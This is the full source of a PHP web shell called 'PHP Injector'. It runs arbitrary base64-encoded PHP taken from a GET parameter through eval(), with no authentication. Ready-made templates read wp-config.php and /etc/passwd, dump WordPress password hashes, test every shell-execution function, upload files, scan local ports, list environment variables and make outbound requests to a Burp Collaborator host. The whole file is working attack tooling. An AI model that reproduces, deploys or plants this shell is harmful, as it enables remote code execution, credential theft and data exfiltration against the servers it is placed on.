<?php
// Capture the eval() output in a buffer so we can place it later
$scriptOutput = "";

if (isset($_GET['cmd'])) {
    // Decode the Base64-encoded PHP command
    $encoded_cmd = $_GET['cmd'];
    $decoded_cmd = base64_decode($encoded_cmd);

    // Execute the decoded command using eval(), capturing any output
    ob_start();
    try {
        eval($decoded_cmd);
    } catch (Throwable $e) {
        echo "Error: " . $e->getMessage();
    }
    $scriptOutput = ob_get_clean();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>PHP Base64 Webshell</title>
  <style>
    body {
      background-color: #121212;
      color: #e0e0e0;
      font-family: Arial, sans-serif;
      margin: 20px;
    }

    /* Heading in lime green */
    h1 {
      color: #32CD32; /* lime green */
    }


    /* Buttons: original purple style */
    button {
      background-color: #6200ee; /* original color */
      color: #ffffff;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      margin: 5px 5px 5px 0;
    }
    button:hover {
      background-color: #3700b3;
    }

    /* Template Buttons block */
    .template-buttons {
      margin: 10px 0;
    }

    /* Text area styling */
    textarea {
      width: 100%;
      box-sizing: border-box;
      background-color: #1e1e1e;
      color: #dcdcaa;
      font-family: 'Courier New', Courier, monospace;
      border: 1px solid #333;
      border-radius: 5px;
      padding: 10px;
      resize: none;
      overflow: hidden;
      line-height: 1.5;
      font-size: 14px;
      height: auto;
      min-height: 20px;
    }
    textarea:focus {
      outline: none;
      border: 1px solid #6200ee;
    }

    /* Collapsible styling */
    .collapsible {
      background-color: #1e1e1e;
      color: #dcdcaa;
      cursor: pointer;
      padding: 10px;
      width: 100%;
      border: none;
      text-align: left;
      outline: none;
      font-size: 15px;
      border-radius: 5px;
      margin-top: 10px;
    }
    .collapsible:hover {
      background-color: #333333;
    }
    .collapsible.active {
      background-color: #333333;
    }

    /* Start expanded. We toggle .hide to collapse if needed. */
    .content {
      display: block;
      padding: 10px;
      background-color: #1e1e1e;
      border-radius: 5px;
      margin-bottom: 10px;
    }
    .content.hide {
      display: none;
    }

    /* Preserve line breaks and also interpret HTML in output */
    .output-content {
      white-space: pre-wrap;
      word-wrap: break-word;
      font-family: inherit;
      color: #dcdcaa;
    }
  </style>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const textarea = document.querySelector("textarea");

      // Auto-expand textarea as needed
      const autoExpand = (el) => {
        el.style.height = "auto"; // Reset height
        el.style.height = el.scrollHeight + "px"; // Set height to match content
      };
      textarea.addEventListener("input", () => autoExpand(textarea));
      autoExpand(textarea);

      // Collapsible logic
      const collapsibles = document.querySelectorAll(".collapsible");
      collapsibles.forEach((col) => {
        col.addEventListener("click", function() {
          this.classList.toggle("active");
          const content = this.nextElementSibling;
          content.classList.toggle("hide");
        });
      });
    });

    // Templates stored in variables
    const listDirectoryTemplate = `
$dir = '/var/www/html'; // Replace with selected directory (relative to current path)

if (is_dir($dir)) {
    echo "<h2>Contents of $dir</h2>";
    
    // Use scandir to retrieve all files, including hidden ones
    $files = scandir($dir);
    
    // Loop through files and display each
    foreach ($files as $file) {
        echo htmlspecialchars($file) . "<br>";
    }
} else {
    echo "The specified path is not a directory.";
}`;

    const readFileTemplate = `
$file = '/var/www/html/wp-config.php'; // Replace with any file, e.g. '/etc/passwd'

echo "<h2>Contents of $file</h2>";
readfile($file);
// If readfile doesn't work, try:
// echo file_get_contents('$file');
`;

    const dumpWordPressUsersTemplate = `
// Database connection details
$servername = "localhost";  // Replace with your database host
$username = "root";         // Replace with your database username
$password = "password";     // Replace with your database password
$dbname = "wordpress";      // Replace with your database name

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Query to fetch users and their roles
$sql = "
    SELECT u.ID, u.user_login, u.user_email, u.user_pass, u.user_registered, m.meta_value AS roles
    FROM wp_users u
    LEFT JOIN wp_usermeta m ON u.ID = m.user_id
    WHERE m.meta_key = 'wp_capabilities'
";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    echo "<h2>Users in wp_users Table with Roles:</h2>";
    echo "<table border='1'>";
    echo "<tr><th>ID</th><th>Username</th><th>Email</th><th>Password Hash</th><th>Registered Date</th><th>Roles</th></tr>";

    while ($row = $result->fetch_assoc()) {
        $roles = @unserialize($row['roles']);
        if ($roles === false) {
            $roles = json_decode($row['roles'], true);
        }

        echo "<tr>";
        echo "<td>" . htmlspecialchars($row['ID']) . "</td>";
        echo "<td>" . htmlspecialchars($row['user_login']) . "</td>";
        echo "<td>" . htmlspecialchars($row['user_email']) . "</td>";
        echo "<td>" . htmlspecialchars($row['user_pass']) . "</td>";
        echo "<td>" . htmlspecialchars($row['user_registered']) . "</td>";
        echo "<td>" . htmlspecialchars(implode(', ', array_keys($roles ?? []))) . "</td>";
        echo "</tr>";
    }
    echo "</table>";
} else {
    echo "No users found in the wp_users table.";
}

$conn->close();
`;

    const phpInfoTemplate = `
phpinfo();
`;

    const uploadFileTemplate = `
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadDir = '/var/www/html/uploads/'; // Replace with desired upload dir
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "<p>File successfully uploaded to $uploadFile</p>";
    } else {
        echo "<p>Error uploading file.</p>";
    }
}

?>
<form method="POST" enctype="multipart/form-data">
    <label for="file">Choose a file to upload:</label>
    <input type="file" name="file" id="file">
    <button type="submit">Upload File</button>
</form>
`;

    const checkShellExecutionTemplate = `
$cmd = 'id';
echo "<pre>";

try {
    echo "=== Using exec() ===\\n";
    $output = [];
    $returnVar = null;
    exec($cmd, $output, $returnVar);
    echo implode("\\n", $output) . "\\n";
    echo "Return code: $returnVar\\n\\n";
} catch (Exception $e) {
    echo "Error with exec(): {$e->getMessage()}\\n";
}

try {
    echo "=== Using shell_exec() ===\\n";
    $output = shell_exec($cmd);
    echo $output . "\\n";
} catch (Exception $e) {
    echo "Error with shell_exec(): {$e->getMessage()}\\n";
}

try {
    echo "=== Using system() ===\\n";
    ob_start();
    system($cmd, $returnVar);
    $output = ob_get_clean();
    echo $output . "\\n";
    echo "Return code: $returnVar\\n\\n";
} catch (Exception $e) {
    echo "Error with system(): {$e->getMessage()}\\n";
}

try {
    echo "=== Using passthru() ===\\n";
    ob_start();
    passthru($cmd);
    $output = ob_get_clean();
    echo $output . "\\n";
} catch (Exception $e) {
    echo "Error with passthru(): {$e->getMessage()}\\n";
}

try {
    echo "=== Using proc_open() ===\\n";
    $descriptors = [
        0 => ['pipe', 'r'],  // STDIN
        1 => ['pipe', 'w'],  // STDOUT
        2 => ['pipe', 'w']   // STDERR
    ];
    $process = proc_open($cmd, $descriptors, $pipes);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo $output . "\\n";
    } else {
        echo "proc_open() failed\\n";
    }
} catch (Exception $e) {
    echo "Error with proc_open(): {$e->getMessage()}\\n";
}

try {
    echo "=== Using popen() ===\\n";
    $handle = popen($cmd, 'r');
    if ($handle) {
        while (!feof($handle)) {
            echo fgets($handle);
        }
        pclose($handle);
        echo "\\n";
    } else {
        echo "popen() failed\\n";
    }
} catch (Exception $e) {
    echo "Error with popen(): {$e->getMessage()}\\n";
}

try {
    echo "=== Using backticks \`$cmd\` ===\\n";
    $output = \`$cmd\`;
    echo $output . "\\n";
} catch (Exception $e) {
    echo "Error with backticks: {$e->getMessage()}\\n";
}

echo "</pre>";
`;

    // Disabled (Blacklisted) Functions template
    const listBlacklistedFunctionsTemplate = `
$disabled_functions = ini_get('disable_functions');

if (!empty($disabled_functions)) {
    echo "<h2>Disabled/Blacklisted Functions</h2>";
    $functions = explode(',', $disabled_functions);
    echo "<ul>";
    foreach ($functions as $fn) {
        echo "<li>" . htmlspecialchars(trim($fn)) . "</li>";
    }
    echo "</ul>";
} else {
    echo "No disabled functions found.";
}
`;

    // Outpbound Web Request
    const webRequestTemplate = `
$url = "http://your-collaborator-id.burpcollaborator.net"; // Replace with your designated URL

// Make the HTTP request
$response = file_get_contents($url);

// Optional: Display a confirmation message
echo $response ? "Request successful" : "Request failed";
`;

  // Installed PHP Modules
  const installedPHPModulesTemplate = `
echo "<h2>Installed PHP Modules:</h2><pre>";
print_r(get_loaded_extensions());
echo "</pre>";
  `;

  // Environment Variables
  const environmentVariablesTemplate = `
foreach ($_ENV as $key => $value) {
    echo htmlspecialchars("$key = $value") . "<br>";
}
  `;

  // Scan Localhost
  const scanLocalhostTemplate = `
$host = '127.0.0.1'; // Localhost IP
$ports = [21, 22, 25, 80, 443, 3306]; // Add Ports to scan

echo "<h2>Scanning Ports on $host:</h2><ul>";

foreach ($ports as $port) {
    $connection = @fsockopen($host, $port, $errno, $errstr, 1); // Timeout set to 1 second
    if ($connection) {
        echo "<li>Port $port: Open</li>";
        fclose($connection);
    } else {
        echo "<li>Port $port: Closed ($errstr)</li>";
    }
}

echo "</ul>";
  `;

  // Test File Drop
  const testFileDropTemplate = `
$file = '/tmp/test.txt'; // Path to the test file
$data = "This is a test file created via PHP."; // Content of the file

// Step 1: Create the file
if (file_put_contents($file, $data)) {
    echo "File created successfully: $file<br>";
} else {
    echo "Failed to create file: $file<br>";
    exit; // Stop further actions if file creation fails
}

// Step 2: Check if the file exists
if (file_exists($file)) {
    echo "File exists: $file<br>";
} else {
    echo "File does not exist after creation: $file<br>";
    exit; // Stop further actions if file doesn't exist
}

// Step 3: Delete the file
if (unlink($file)) {
    echo "File deleted successfully: $file<br>";
} else {
    echo "Failed to delete file: $file<br>";
}

// Step 4: Verify deletion
if (!file_exists($file)) {
    echo "File deletion confirmed: $file<br>";
} else {
    echo "File still exists after deletion attempt: $file<br>";
}
  `;

  // MySQL View Databases
  const mysqlViewDatabasesTemplate = `
// Database connection details
$servername = "localhost";       // Replace with your database host
$username = "root";              // Replace with your database username
$password = "password";          // Replace with your database password

// **Disable MySQLi Error Reporting to Prevent Exceptions**
mysqli_report(MYSQLI_REPORT_OFF);

// **Function to Display Errors Inline**
function displayError($message) {
    // Formats error messages with indentation for clarity
    echo "  [Error] " . htmlspecialchars($message) . "<br>";
}

// **Create a New MySQLi Connection Without Specifying a Database**
$conn = new mysqli($servername, $username, $password);

// **Check the Connection**
if ($conn->connect_error) {
    // Display the connection error and exit
    echo "Connection failed: " . htmlspecialchars($conn->connect_error) . "<br>";
    echo "Database connection failed. Please check your credentials.<br>";
}

// **Execute the SHOW DATABASES Query**
$databasesResult = $conn->query("SHOW DATABASES");

// **Check if SHOW DATABASES was Successful**
if (!$databasesResult) {
    // Display the error and exit
    echo "Failed to retrieve databases: " . htmlspecialchars($conn->error) . "<br>";
    echo "Cannot proceed without retrieving databases.<br>";
}

// **Initialize an Array to Hold Database Structures**
$databaseStructure = [];

// **Loop Through Each Database**
while ($dbRow = $databasesResult->fetch_assoc()) {
    $dbname = $dbRow['Database'];
    $databaseStructure[$dbname] = []; // Initialize an empty array for tables

    // **Attempt to Select the Current Database**
    if ($conn->select_db($dbname)) {
        // **Execute the SHOW TABLES Query for the Current Database**
        $tablesResult = $conn->query("SHOW TABLES");

        if ($tablesResult) {
            // **Fetch and Store Each Table Name**
            while ($tableRow = $tablesResult->fetch_array()) {
                $databaseStructure[$dbname][] = htmlspecialchars($tableRow[0]);
            }
            // **Free the Tables Result Set**
            $tablesResult->free();
        } else {
            // **Display the Error and Note It in the Structure**
            $errorMsg = "Could not retrieve tables for database '$dbname': " . $conn->error;
            displayError($errorMsg);
            $databaseStructure[$dbname][] = "[Error] Could not retrieve tables: " . htmlspecialchars($conn->error);
        }
    } else {
        // **Display the Error and Note It in the Structure**
        $errorMsg = "Could not select database '$dbname': " . $conn->error;
        displayError($errorMsg);
        $databaseStructure[$dbname][] = "[Error] Could not select database: " . htmlspecialchars($conn->error);
    }
}

// **Free the Databases Result Set**
$databasesResult->free();

// **Close the MySQL Connection**
$conn->close();

// **Output the Database and Tables Structure**
foreach ($databaseStructure as $dbname => $tables) {
    echo "<strong>Database:</strong> " . htmlspecialchars($dbname) . "<br>";
    foreach ($tables as $table) {
        echo "&nbsp;&nbsp;<strong>Table:</strong> " . htmlspecialchars($table) . "<br>";
    }
    echo "<br>"; // Add an empty line for readability
}
  `;
  
// NEW: Recursive Directory Listing Template
const recursiveDirectoryListingTemplate = `
// Function to recursively scan directory and list contents
function listDirectoryContents($directory, $indentLevel = 0)
{
    // Check if the directory exists
    if (!is_dir($directory)) {
        echo str_repeat(" ", $indentLevel * 4) . "[Error] Directory not found: $directory\\n";
        return;
    }

    // Open the directory
    $files = scandir($directory);

    echo '<ul style="list-style-type: none;">';

    foreach ($files as $file) {
        // Skip special directories '.' and '..'
        if ($file === '.' || $file === '..') {
            continue;
        }

        $filePath = $directory . DIRECTORY_SEPARATOR . $file;

        // Print the current file or folder
        if (is_dir($filePath)) {
            // Add a toggle for folders
            echo '<li><span class="toggle-folder" style="cursor: pointer;">[+]</span> ' . htmlspecialchars($file) . '<ul class="folder-contents" style="display: none; margin-left: 20px;">';
            listDirectoryContents($filePath, $indentLevel + 1);
            echo '</ul></li>';
        } else {
            echo '<li>' . htmlspecialchars($file) . '</li>';
        }
    }

    echo '</ul>';
}

$rootDirectory = "/var/www/html"; // CHANGE ME

// HTML Output
echo '<!DOCTYPE html><html><head><title>Directory Listing</title>';
echo '<script>
document.addEventListener("DOMContentLoaded", function() {
    const toggles = document.querySelectorAll(".toggle-folder");
    toggles.forEach(toggle => {
        toggle.addEventListener("click", function() {
            const folderContents = this.parentNode.querySelector(".folder-contents");
            if (folderContents.style.display === "none") {
                folderContents.style.display = "block";
                this.textContent = "[-]";
            } else {
                folderContents.style.display = "none";
                this.textContent = "[+]";
            }
        });
    });
});
<\/script>';
echo '</head><body>';
listDirectoryContents($rootDirectory);
echo '</body></html>';
`;



    // Encode user input as Base64
    function encodeBase64() {
      const commandInput = document.getElementById("command").value;
      const encodedCommand = btoa(commandInput);
      document.getElementById("cmd").value = encodedCommand;
      return true;
    }

    // Apply template
    function applyTemplate(template) {
      const textarea = document.getElementById("command");
      textarea.value = template;
      textarea.dispatchEvent(new Event("input")); // Trigger auto-expand
    }
    
    // Prefill Last Command Function
    function prefillLastCommand() {
      const urlParams = new URLSearchParams(window.location.search);
      const encodedCmd = urlParams.get('cmd');
      const prefillButton = document.getElementById('prefillButton');
      if (encodedCmd) {
    prefillButton.style.display = 'inline-block'; // Show the button
    } else {
      prefillButton.style.display = 'none'; // Hide the button
    }
      if (encodedCmd) {
        try {
          const decodedCmd = atob(encodedCmd);
          const textarea = document.getElementById('command');
          textarea.value = decodedCmd;
          textarea.dispatchEvent(new Event("input")); // Trigger auto-expand
        } catch (e) {
          console.error('Decoding Error:', e);
        }
      }
    }
  </script>
</head>
<body>
  <!-- Main Heading in lime green -->
  <h1>PHP Injector</h1>

  <!-- Collapsible Command Entry -->
  <button type="button" class="collapsible active">Command Entry</button>
  <div class="content">
    <form method="GET" onsubmit="return encodeBase64();">
      <textarea id="command" placeholder="Enter your PHP code here..."></textarea>
      <input type="hidden" name="cmd" id="cmd" value="">
      <br>
      <button type="submit">Execute</button>
        <?php if (!empty($_GET['cmd'])): ?>
          <button id="prefillButton" type="button" onclick="prefillLastCommand()">Prefill Last Command</button>
    <?php endif; ?>
    </form>
  </div>

  <!-- Collapsible Templates -->
  <button type="button" class="collapsible active">Templates</button>
  <div class="content">
    <div class="template-buttons">
      <button type="button" onclick="applyTemplate(listDirectoryTemplate)">List Directory</button>
      <button type="button" onclick="applyTemplate(readFileTemplate)">Read File</button>
      <button type="button" onclick="applyTemplate(mysqlViewDatabasesTemplate)">MySQL View DB's</button>
      <button type="button" onclick="applyTemplate(dumpWordPressUsersTemplate)">MySQL Dump WP Hashes</button>
      <button type="button" onclick="applyTemplate(phpInfoTemplate)">PHP Info</button>
      <button type="button" onclick="applyTemplate(testFileDropTemplate)">Test File Drop</button>
      <button type="button" onclick="applyTemplate(uploadFileTemplate)">Upload File</button>
      <button type="button" onclick="applyTemplate(checkShellExecutionTemplate)">Check Shell Execution</button>
      <button type="button" onclick="applyTemplate(listBlacklistedFunctionsTemplate)">List Disabled Functions</button>
      <button type="button" onclick="applyTemplate(webRequestTemplate)">Outbound Web Request</button>
      <button type="button" onclick="applyTemplate(installedPHPModulesTemplate)">Installed PHP Modules</button>
      <button type="button" onclick="applyTemplate(environmentVariablesTemplate)">Environment Variables</button>
      <button type="button" onclick="applyTemplate(scanLocalhostTemplate)">Scan Localhost</button>
      <button type="button" onclick="applyTemplate(recursiveDirectoryListingTemplate)">Recursive Directory Listing</button>
    </div>
  </div>

  <!-- Collapsible Output Section (expanded by default if there's output) -->
  <?php if (!empty($scriptOutput)): ?>
    <button type="button" class="collapsible active">Output</button>
    <div class="content">
      <div class="output-content">
        <!-- Wrap in <pre> with white-space: pre-wrap to preserve newlines without escaping HTML. -->
        <pre style="white-space: pre-wrap; word-wrap: break-word;">
<?php echo $scriptOutput; ?>
        </pre>
      </div>
    </div>
  <?php endif; ?>
</body>
</html>
